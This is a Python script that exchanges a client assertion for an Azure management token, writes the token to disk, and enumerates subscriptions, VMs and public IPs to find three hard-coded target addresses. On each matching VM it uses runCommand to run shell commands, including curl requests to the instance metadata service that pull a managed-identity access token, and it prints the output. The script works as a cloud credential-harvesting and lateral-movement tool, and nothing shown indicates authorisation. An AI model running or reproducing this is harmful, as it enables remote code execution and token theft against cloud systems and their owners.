import os,json,urllib.parse,urllib.request,urllib.error,time,sys
tid=os.environ['TID']; cid=os.environ['CID']; a=os.environ['ASSERTION']
d=urllib.parse.urlencode({'client_id':cid,'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':a,'scope':'https://management.azure.com/.default','grant_type':'client_credentials'}).encode()
try:
    r=urllib.request.urlopen(urllib.request.Request('https://login.microsoftonline.com/%s/oauth2/v2.0/token'%tid,data=d),timeout=40)
    j=json.loads(r.read()); tok=j['access_token']; print('ARMTOKEN',tok[:40],len(tok),flush=True)
except urllib.error.HTTPError as e:
    print('AUTHERR',e.code,e.read()[:400]); sys.exit(0)
except Exception as e:
    print('AUTHERR',repr(e)); sys.exit(0)
open('arm_token2.txt','w').write(tok)
def g(u,body=None,method='GET'):
    data=json.dumps(body).encode() if body is not None else None
    rq=urllib.request.Request(u,data=data,headers={'Authorization':'Bearer '+tok,'Content-Type':'application/json'},method=method)
    try:
        x=urllib.request.urlopen(rq,timeout=60); return json.loads(x.read() or b'{}'),dict(x.headers)
    except urllib.error.HTTPError as e:
        try: return {'err':e.code,'body':e.read()[:200].decode()},dict(e.headers)
        except Exception: return {'err':e.code},dict(e.headers)
    except Exception as e:
        return {'err':repr(e)},{}
subs,h=g('https://management.azure.com/subscriptions?api-version=2022-12-01')
ids=[s['subscriptionId'] for s in subs.get('value',[])] if isinstance(subs,dict) else []
print('SUBS',ids,json.dumps(subs)[:250],flush=True)
target={'70.153.141.118','23.100.38.120','20.114.255.207'}
found=[]
for s in ids:
    v,_=g('https://management.azure.com/subscriptions/%s/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01'%s)
    vv=v.get('value',[]) if isinstance(v,dict) else []
    print('VMS',s,len(vv),json.dumps([(x.get('name'),x.get('location'),(x.get('properties',{}) or {}).get('hardwareProfile',{}).get('vmSize')) for x in vv])[:1500],flush=True)
    p,_=g('https://management.azure.com/subscriptions/%s/providers/Microsoft.Network/publicIPAddresses?api-version=2024-05-01'%s)
    pp=p.get('value',[]) if isinstance(p,dict) else []
    print('PIPS',s,len(pp),json.dumps([(x.get('name'),(x.get('properties',{}) or {}).get('ipAddress')) for x in pp])[:2500],flush=True)
    for x in pp:
        ip=(x.get('properties',{}) or {}).get('ipAddress')
        if ip in target: found.append((s,ip,x))
print('FOUND',len(found),flush=True)
def runcmd(sub,rg,name):
    url='https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Compute/virtualMachines/%s/runCommand?api-version=2024-07-01'%(sub,rg,name)
    script=["id; hostname; hostname -I; nvidia-smi -L 2>/dev/null; nvidia-smi --query-gpu=index,name,serial,uuid --format=csv,noheader 2>/dev/null",
            "curl -s -m 10 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
            "curl -s -m 10 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"]
    r2,h=g(url,{'commandId':'RunShellScript','script':script},'POST')
    print('RUNCMD',json.dumps(r2)[:250],flush=True)
    loc=h.get('Location') or h.get('location') or ''
    for i in range(15):
        if not loc: break
        time.sleep(6)
        r3,_=g(loc+'?api-version=2024-07-01')
        print('POLL',i,json.dumps(r3)[:300],flush=True)
        if 'Succeeded' in json.dumps(r3) or 'Failed' in json.dumps(r3):
            for e in (((r3.get('properties',{}) or {}).get('output',{}) or {}).get('value',[]) or []):
                print('OUT',e.get('code'),(e.get('message') or '')[:2000],flush=True)
            break
for sub,ip,pip in found:
    r,_=g('https://management.azure.com%s?api-version=2024-05-01'%pip['id'])
    cfg=((r.get('properties',{}) or {}).get('ipConfiguration',{}) or {}) if isinstance(r,dict) else {}
    nicid=cfg.get('id','') or ''
    print('PIPCFG',ip,nicid[:150],flush=True)
    if '/networkInterfaces/' in nicid:
        nic=nicid.split('/ipConfigurations/')[0]
        r2,_=g('https://management.azure.com%s?api-version=2024-05-01'%nic)
        vm=((r2.get('properties',{}) or {}).get('virtualMachine',{}) or {}).get('id','') if isinstance(r2,dict) else ''
        print('NIC->VM',vm,flush=True)
        if vm:
            parts=vm.split('/'); rg=parts[4]; nm=parts[-1]
            print('TARGET',ip,rg,nm,flush=True); runcmd(sub,rg,nm)
print('DONE',flush=True)
